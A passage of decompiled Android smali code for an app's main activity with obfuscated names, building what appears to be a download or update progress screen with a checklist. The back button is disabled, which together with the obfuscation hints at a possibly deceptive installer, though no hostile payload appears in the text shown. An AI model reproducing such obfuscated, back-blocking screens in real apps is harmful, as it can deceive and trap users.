    const/4 v2, 0x6

    .line 14
    invoke-virtual {p0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 15
    .line 16
    .line 17
    move-result v2

    .line 18
    const/4 v3, -0x1

    .line 19
    invoke-direct {v1, v3, v2}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 20
    .line 21
    .line 22
    invoke-virtual {v0, v1}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 23
    .line 24
    .line 25
    return-object v0
.end method

.method public final iTycxX30d0YvQFAGBVYP(I)Landroid/widget/ImageView;
    .locals 3

    .line 1
    new-instance v0, Landroid/widget/ImageView;

    .line 2
    .line 3
    invoke-direct {v0, p0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 4
    .line 5
    .line 6
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 11
    .line 12
    .line 13
    move-result-object v2

    .line 14
    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    .line 15
    .line 16
    .line 17
    move-result-object v1

    .line 18
    invoke-virtual {v0, v1}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 19
    .line 20
    .line 21
    goto :goto_0

    .line 22
    :catch_0
    const/high16 v1, 0x7f0d0000

    .line 23
    .line 24
    invoke-virtual {v0, v1}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 25
    .line 26
    .line 27
    :goto_0
    const/4 v1, 0x1

    .line 28
    invoke-virtual {v0, v1}, Landroid/view/View;->setClipToOutline(Z)V

    .line 29
    .line 30
    .line 31
    new-instance v1, LU4clZ2NNNKj5ZWU/HrAWa37pvWeygr;

    .line 32
    .line 33
    const/4 v2, 0x0

    .line 34
    invoke-direct {v1, p0, v2}, LU4clZ2NNNKj5ZWU/HrAWa37pvWeygr;-><init>(Landroid/view/KeyEvent$Callback;I)V

    .line 35
    .line 36
    .line 37
    invoke-virtual {v0, v1}, Landroid/view/View;->setOutlineProvider(Landroid/view/ViewOutlineProvider;)V

    .line 38
    .line 39
    .line 40
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    .line 41
    .line 42
    invoke-direct {v1, p1, p1}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 43
    .line 44
    .line 45
    invoke-virtual {v0, v1}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 46
    .line 47
    .line 48
    return-object v0
.end method

.method public final n6vOQ2w2T3oBW(I)I
    .locals 2

    .line 1
    int-to-float p1, p1

    .line 2
    invoke-virtual {p0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    .line 3
    .line 4
    .line 5
    move-result-object v0

    .line 6
    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    .line 7
    .line 8
    .line 9
    move-result-object v0

    .line 10
    const/4 v1, 0x1

    .line 11
    invoke-static {v1, p1, v0}, Landroid/util/TypedValue;->applyDimension(IFLandroid/util/DisplayMetrics;)F

    .line 12
    .line 13
    .line 14
    move-result p1

    .line 15
    float-to-int p1, p1

    .line 16
    return p1
.end method

.method public final onBackPressed()V
    .locals 0

    .line 1
    return-void
.end method

.method public final onCreate(Landroid/os/Bundle;)V
    .locals 24

    move-object/from16 v0, p0

    .line 1
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 2
    const-string v1, "fgqloalm"

    const/4 v6, 0x0

    invoke-virtual {v0, v1, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    iput-object v1, v0, Lio/bluewave/app/MainActivity;->HrAWa37pvWeygr:Landroid/content/SharedPreferences;

    .line 3
    const-string v2, "rmxp"

    invoke-interface {v1, v2, v6}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 4
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y()V

    .line 5
    invoke-virtual {v0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_0
    const v1, 0x7f0f0026

    .line 6
    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    iget v2, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    .line 7
    :try_start_0
    invoke-static {v1}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 8
    :catch_0
    iput v2, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    const v1, 0x7f0f00b3

    .line 9
    invoke-virtual {v0, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    iput-object v2, v0, Lio/bluewave/app/MainActivity;->Lgt5etflyFQU5poaxq:Ljava/lang/String;

    .line 10
    new-instance v2, Landroid/widget/ViewFlipper;

    invoke-direct {v2, v0}, Landroid/widget/ViewFlipper;-><init>(Landroid/content/Context;)V

    iput-object v2, v0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 11
    new-instance v3, Landroid/widget/ScrollView;

    invoke-direct {v3, v0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    const/4 v7, -0x1

    .line 12
    invoke-virtual {v3, v7}, Landroid/view/View;->setBackgroundColor(I)V

    const/4 v8, 0x1

    .line 13
    invoke-virtual {v3, v8}, Landroid/widget/ScrollView;->setFillViewport(Z)V

    .line 14
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v4

    .line 15
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vpNdwwpwBwplN()Landroid/widget/LinearLayout;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 16
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->NGL7fgNWbzfZaqgpQY()Landroid/view/View;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 17
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v5

    .line 18
    invoke-virtual {v5, v8}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v9, 0x18

    .line 19
    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v10

    const/16 v11, 0x28

    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v12

    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v13

    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v14

    invoke-virtual {v5, v10, v12, v13, v14}, Landroid/view/View;->setPadding(IIII)V

    const/16 v10, 0x48

    .line 20
    invoke-virtual {v0, v10}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v10

    invoke-virtual {v0, v10}, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP(I)Landroid/widget/ImageView;

    move-result-object v10

    .line 21
    invoke-virtual {v5, v10}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v10, 0x7f0f001c

    .line 22
    invoke-virtual {v0, v10}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v12

    const/16 v13, 0x16

    iget v14, v0, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP:I

    invoke-virtual {v0, v12, v13, v14, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v12

    const/16 v15, 0x11

    .line 23
    invoke-virtual {v12, v15}, Landroid/widget/TextView;->setGravity(I)V

    const/16 v13, 0x10

    .line 24
    invoke-virtual {v0, v13}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v11

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v10

    invoke-static {v12, v6, v11, v6, v10}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 25
    invoke-virtual {v5, v12}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v10, 0x7f0f00b1

    .line 26
    invoke-virtual {v0, v10}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v11

    const/16 v12, 0xe

    iget v10, v0, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5:I

    invoke-virtual {v0, v11, v12, v10, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v11

    .line 27
    invoke-virtual {v11, v15}, Landroid/widget/TextView;->setGravity(I)V

    const/16 v9, 0x1c

    .line 28
    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-static {v11, v6, v6, v6, v8}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 29
    invoke-virtual {v5, v11}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v8, 0x7f0f00a8

    .line 30
    invoke-virtual {v0, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8, v12, v10, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v8

    iput-object v8, v0, Lio/bluewave/app/MainActivity;->UvqyQKvSoOiOdM7m:Landroid/widget/TextView;

    .line 31
    invoke-virtual {v8, v15}, Landroid/widget/TextView;->setGravity(I)V

    .line 32
    iget-object v8, v0, Lio/bluewave/app/MainActivity;->UvqyQKvSoOiOdM7m:Landroid/widget/TextView;

    invoke-virtual {v5, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 33
    new-instance v8, Landroid/widget/ProgressBar;

    const/4 v11, 0x0

    const v9, 0x1010078

    invoke-direct {v8, v0, v11, v9}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;Landroid/util/AttributeSet;I)V

    iput-object v8, v0, Lio/bluewave/app/MainActivity;->k7svliQKAV6mwdxD1R:Landroid/widget/ProgressBar;

    const/16 v9, 0x3e8

    .line 34
    invoke-virtual {v8, v9}, Landroid/widget/ProgressBar;->setMax(I)V

    .line 35
    iget-object v8, v0, Lio/bluewave/app/MainActivity;->k7svliQKAV6mwdxD1R:Landroid/widget/ProgressBar;

    invoke-virtual {v8, v6}, Landroid/widget/ProgressBar;->setProgress(I)V

    .line 36
    iget-object v8, v0, Lio/bluewave/app/MainActivity;->k7svliQKAV6mwdxD1R:Landroid/widget/ProgressBar;

    new-instance v9, Landroid/widget/LinearLayout$LayoutParams;

    invoke-virtual {v0, v1}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v11

    invoke-direct {v9, v7, v11}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v5, v8, v9}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 37
    iget-object v8, v0, Lio/bluewave/app/MainActivity;->k7svliQKAV6mwdxD1R:Landroid/widget/ProgressBar;

    const/16 v9, 0xc

    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v11

    invoke-static {v8, v6, v11, v6, v6}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 38
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v8

    .line 39
    invoke-virtual {v8, v15}, Landroid/widget/LinearLayout;->setGravity(I)V

    const/16 v11, 0x8

    .line 40
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    invoke-static {v8, v6, v15, v6, v6}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 41
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v1, "0 MB / "

    invoke-direct {v15, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, v0, Lio/bluewave/app/MainActivity;->Lgt5etflyFQU5poaxq:Ljava/lang/String;

    invoke-virtual {v15, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v9, v10, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v1

    iput-object v1, v0, Lio/bluewave/app/MainActivity;->KFXTIAu8cfRMDPCSl8UB:Landroid/widget/TextView;

    .line 42
    invoke-virtual {v8, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 43
    new-instance v1, Landroid/view/View;

    invoke-direct {v1, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 44
    new-instance v15, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v12, 0x3f800000    # 1.0f

    invoke-direct {v15, v6, v6, v12}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v8, v1, v15}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 45
    const-string v1, "0%"

    invoke-virtual {v0, v1, v9, v10, v6}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v1

    iput-object v1, v0, Lio/bluewave/app/MainActivity;->v4mmWMPipWN7Mc:Landroid/widget/TextView;

    .line 46
    invoke-virtual {v8, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 47
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v15, -0x2

    invoke-direct {v1, v7, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v5, v8, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 48
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v1

    .line 49
    new-instance v8, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v8}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 50
    iget v12, v0, Lio/bluewave/app/MainActivity;->vf54w4r378FP4oEVzzHh:I

    invoke-virtual {v8, v12}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 51
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    int-to-float v15, v15

    invoke-virtual {v8, v15}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 52
    invoke-virtual {v1, v8}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 53
    invoke-virtual {v0, v13}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    invoke-virtual {v0, v13}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v15

    invoke-virtual {v0, v13}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    invoke-virtual {v0, v13}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v11

    invoke-virtual {v1, v8, v15, v7, v11}, Landroid/view/View;->setPadding(IIII)V

    .line 54
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v7

    .line 55
    invoke-virtual {v7, v13}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 56
    new-instance v8, Landroid/widget/ImageView;

    invoke-direct {v8, v0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 57
    new-instance v11, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;

    iget v15, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    invoke-direct {v11, v15}, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;-><init>(I)V

    invoke-virtual {v8, v11}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 58
    new-instance v11, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v15, 0x20

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v13

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-direct {v11, v13, v6}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v7, v8, v11}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 59
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    move-result-object v6

    .line 60
    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v8

    const/4 v11, 0x0

    invoke-virtual {v6, v8, v11, v11, v11}, Landroid/view/View;->setPadding(IIII)V

    const v8, 0x7f0f00ae

    .line 61
    invoke-virtual {v0, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v8

    iget v13, v0, Lio/bluewave/app/MainActivity;->OI37Slpn8pmO:I

    const/4 v9, 0x1

    const/16 v15, 0xe

    invoke-virtual {v0, v8, v15, v13, v9}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v8

    invoke-virtual {v6, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v8, 0x7f0f00ad

    .line 62
    invoke-virtual {v0, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v8

    const/16 v9, 0xc

    invoke-virtual {v0, v8, v9, v10, v11}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v8

    invoke-virtual {v6, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 63
    invoke-virtual {v7, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 64
    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-static {v7, v11, v11, v11, v6}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 65
    invoke-virtual {v1, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const v6, 0x7f0f00a9

    .line 66
    invoke-virtual {v0, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    const v7, 0x7f0f00aa

    invoke-virtual {v0, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    const v8, 0x7f0f00ab

    .line 67
    invoke-virtual {v0, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v8

    const v9, 0x7f0f00ac

    invoke-virtual {v0, v9}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v9

    filled-new-array {v6, v7, v8, v9}, [Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    .line 68
    :goto_0
    const-string v8, "\u2713"

    const/4 v11, 0x6

    const/4 v15, 0x4

    if-ge v7, v15, :cond_1

    aget-object v15, v6, v7

    .line 69
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v9

    move-object/from16 v19, v6

    const/16 v6, 0x10

    .line 70
    invoke-virtual {v9, v6}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 71
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v11

    move/from16 v20, v7

    const/4 v7, 0x0

    invoke-virtual {v9, v7, v6, v7, v11}, Landroid/view/View;->setPadding(IIII)V

    const/4 v6, 0x0

    .line 72
    invoke-virtual {v9, v6}, Landroid/view/View;->setAlpha(F)V

    .line 73
    new-instance v6, Landroid/widget/ProgressBar;

    invoke-direct {v6, v0}, Landroid/widget/ProgressBar;-><init>(Landroid/content/Context;)V

    .line 74
    new-instance v11, Landroid/widget/LinearLayout$LayoutParams;

    move/from16 v21, v13

    const/16 v7, 0x10

    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v13

    move/from16 v22, v12

    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v12

    invoke-direct {v11, v13, v12}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v6, v11}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    const/16 v11, 0xa

    .line 75
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v12

    const/4 v13, 0x0

    invoke-static {v6, v13, v13, v12, v13}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 76
    invoke-virtual {v9, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 77
    iget v12, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    const/4 v13, 0x1

    invoke-virtual {v0, v8, v7, v12, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v8

    const/16 v7, 0x8

    .line 78
    invoke-virtual {v8, v7}, Landroid/view/View;->setVisibility(I)V

    .line 79
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    const/4 v11, 0x0

    invoke-static {v8, v11, v11, v7, v11}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 80
    invoke-virtual {v9, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    const/16 v7, 0xd

    .line 81
    invoke-virtual {v0, v15, v7, v14, v11}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v7

    invoke-virtual {v9, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 82
    invoke-virtual {v1, v9}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 83
    iget-object v7, v0, Lio/bluewave/app/MainActivity;->NJWhmIsCa4qdfEsJnpJ:Ljava/util/ArrayList;

    invoke-virtual {v7, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 84
    iget-object v7, v0, Lio/bluewave/app/MainActivity;->y8wqdjwzM2qJr:Ljava/util/ArrayList;

    invoke-virtual {v7, v6}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 85
    iget-object v6, v0, Lio/bluewave/app/MainActivity;->W6zVDLWo5CGp411:Ljava/util/ArrayList;

    invoke-virtual {v6, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v7, v20, 0x1

    move-object/from16 v6, v19

    move/from16 v13, v21

    move/from16 v12, v22

    goto/16 :goto_0

    :cond_1
    move/from16 v22, v12

    move/from16 v21, v13

    .line 86
    iput-object v1, v0, Lio/bluewave/app/MainActivity;->GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

    const/4 v6, 0x0

    .line 87
    invoke-virtual {v1, v6}, Landroid/view/View;->setAlpha(F)V

    .line 88
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

    const/16 v7, 0x8

    invoke-virtual {v1, v7}, Landroid/view/View;->setVisibility(I)V

    .line 89
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

    const/16 v6, 0x18

    invoke-virtual {v0, v6}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v7

    const/4 v13, 0x0

    invoke-static {v1, v13, v7, v13, v13}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 90
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

    invoke-virtual {v5, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 91
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    move-result-object v1

    iput-object v1, v0, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    const/16 v6, 0x11

    .line 92
    invoke-virtual {v1, v6}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 93
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    const/16 v6, 0x24

    invoke-virtual {v0, v6}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v6

    invoke-virtual {v1, v13, v6, v13, v13}, Landroid/view/View;->setPadding(IIII)V

    .line 94
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    const/4 v6, 0x0

    invoke-virtual {v1, v6}, Landroid/view/View;->setAlpha(F)V

    .line 95
    new-instance v1, Landroid/widget/ImageView;

    invoke-direct {v1, v0}, Landroid/widget/ImageView;-><init>(Landroid/content/Context;)V

    .line 96
    new-instance v6, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;

    invoke-direct {v6, v10}, LU4clZ2NNNKj5ZWU/n6vOQ2w2T3oBW;-><init>(I)V

    invoke-virtual {v1, v6}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 97
    iget-object v6, v0, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    new-instance v7, Landroid/widget/LinearLayout$LayoutParams;

    const/16 v15, 0xe

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v9

    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v12

    invoke-direct {v7, v9, v12}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {v6, v1, v7}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const v6, 0x7f0f00b9

    .line 98
    invoke-virtual {v0, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    const/16 v7, 0xb

    const/4 v13, 0x0

    invoke-virtual {v0, v1, v7, v10, v13}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    move-result-object v1

    const/4 v15, 0x4

    .line 99
    invoke-virtual {v0, v15}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    move-result v9

    invoke-static {v1, v9, v13, v13, v13}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 100
    iget-object v9, v0, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    invoke-virtual {v9, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 101
    iget-object v1, v0, Lio/bluewave/app/MainActivity;->wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

    invoke-virtual {v5, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 102
    invoke-virtual {v4, v5}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 103
    invoke-virtual {v3, v4}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 104
    invoke-virtual {v2, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 105
    iget-object v9, v0, Lio/bluewave/app/MainActivity;->VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

    .line 106
    new-instance v12, Landroid/widget/ScrollView;

